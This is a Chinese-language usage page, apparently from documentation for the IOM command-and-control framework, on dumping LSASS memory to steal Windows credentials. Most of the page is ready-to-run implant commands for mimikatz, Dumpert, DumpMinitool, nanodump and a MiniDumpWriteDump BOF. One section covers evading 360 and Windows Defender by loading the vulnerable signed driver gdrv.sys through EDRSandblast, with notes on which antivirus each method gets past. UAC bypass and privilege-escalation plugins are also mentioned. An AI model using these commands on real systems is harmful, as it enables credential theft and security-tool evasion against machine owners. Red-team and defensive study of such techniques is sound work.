---
title: Dump LSASS
---

# Dump LSASS

通常在提权或绕过UAC后，我们会使用诸如 Mimikatz 或 一些DumpLSASS 工具来获取 lsass.dmp，进而提取凭据。本文将主要举例如何在 IOM 环境中的用法。

## 一些常见的导出方法

按照执行方式举例

### PE

- mimikatz
- procdump 
- dumpert
- avdump
- sqldumper.exe
- 等等

你可以使用execute_exe
```
execute_exe "D:\TOOL\iom_test\mimikatz.exe" -- log "privilege::debug" "sekurlsa::logonPasswords full" exit
```
![mimikatz](../../assets/usage/lsass/mimikatz.png)

和execute_exe相比, inline_exe的隐蔽性会更好, 但是稳定性方面一些不稳定操作crash或查杀会导致implant直接崩溃
```
inline_exe "D:\TOOL\iom_test\Outflank-Dumpert.exe"
```
![Dumpert](../../assets/usage/lsass/dumpert.png)

### C\#

- DumpMinitool
- SharpDump
- 等

同样的, 你可以找到对应的execute_assembly和inline_assembly来执行
```bash
execute_assembly "C:\Program Files\dotnet\sdk\8.0.100\Extensions\dump\DumpMinitool.exe" -- --file lsass.dmp --processId <pid> --dumpType Full
inline_assembly "C:\Program Files\dotnet\sdk\8.0.100\Extensions\dump\DumpMinitool.exe" -- --file lsass.dmp --processId <pid> --dumpType Full
```


### Dll

- dumpert-dll
- comsvcs.dll

```
execute_dll "D:\c2测试目录\Dumpert\Dumpert-DLL\x64\Release\Outflank-Dumpert-DLL.dll" -e Dump
inline_dll "D:\c2测试目录\Dumpert\Dumpert-DLL\x64\Release\Outflank-Dumpert-DLL.dll" -e Dump
```

## Bypass 360/Windows Defender
以上大多数方法都已失效，360和Windows Defender都会直接查杀，一些日志相关结果如下:

1. 文件落地执行直接查杀

2. 牺牲进程注入查杀

3. 读取LSASS敏感信息查杀

4. 检测到lsass.dmp文件转存储到了本地磁盘的查杀lsass.dmp文件本身

360核晶, [附截图](../../assets/usage/lsass/360hvm.png)

Windows Defender , [附截图](../../assets/usage/lsass/windows_defender.png)

下面介绍几个bypass方法。

### EDRSandblast 
EDRSandBlast是一个用C编写的工具，可将易受攻击的签名驱动程序武器化以绕过 EDR 检测（通知例程回调、对象回调和ETW TI提供程序）和LSASS保护。还实施了多种用户态脱钩技术来逃避用户态监控。

经过测试wd可以过

```
mkdir "C:\temp"
cd "C:\temp"
upload "D:\EDRSandblast\x64\Release\gdrv.sys" "C:\temp\gdrv.sys"
execute_exe "D:\EDRSandblast\x64\Release\EDRSandblast_LsassDump.exe"
```

![EDRSandblast_LsassDump.png](../../assets/usage/lsass/EDRSandblast_LsassDump.png)

![temp_edrsandblast](../../assets/usage/lsass/temp_edrsandblast.png)

### NanoDump
nanodump是一个一种灵活的工具，可创建 LSASS 进程的小型转储

经测试，核晶和windows defender都无感。

1. 通过fork间接读取 LSASS ,并使用无效签名将转储写入到目标机器磁盘
```
nanodump -- --fork --write "C:\lsass.dmp"
.\restore_signature.exe lsass.dmp
python -m pypykatz lsa minidump lsass.dmp
```
![nanodump.png](../../assets/usage/lsass/nanodump2.png)

2. 使用 seclogon Leak Remote 在记事本进程中泄漏 LSASS 句柄，复制该句柄以访问 LSASS，然后通过创建分叉并使用有效签名(--valid)，下载转储来间接读取它
```
nanodump -- --seclogon-leak-remote "C:\Windows\notepad.exe" --fork --valid
```
![seclogon-leak-remote.png](../../assets/usage/lsass/seclogon-leak-remote.png)

### MiniDumpWriteDump

360核晶和wd都无感，但是本地测试时此方法会生成更大的转储文件约60M (nanodump的文件10M)
```
bof "D:\BOFs\MiniDumpWriteDump\minidumpwritedump.x64.o" -- int:648 str:"C:\lsass.dmp"
```

![MiniDumpWriteDump](../../assets/usage/lsass/MiniDumpWriteDump.png)

## 其他:

对于UAC和提权方面，iom目前也已经支持了一些常见的插件，如UAC bypass、ElevateKit等，可以直接使用。

用于提权的 ElevateKit 提权截图示例如下:

![ElevateKit](../../assets/usage/lsass/ElevateKit.png)

UAC Bypass截图:

![UAC Bypass](../../assets/usage/lsass/uac-bypass.png)

## 参考

- https://github.com/fortra/nanodump
- https://github.com/rookuu/BOFs
- https://github.com/wavestone-cdt/EDRSandblast
- https://github.com/outflanknl/Dumpert
- https://s3cur3th1ssh1t.github.io/Reflective-Dump-Tools
- https://3gstudent.github.io
- https://redsiege.com/blog/2024/03/dumping-lsass-like-its-2019/
- ...
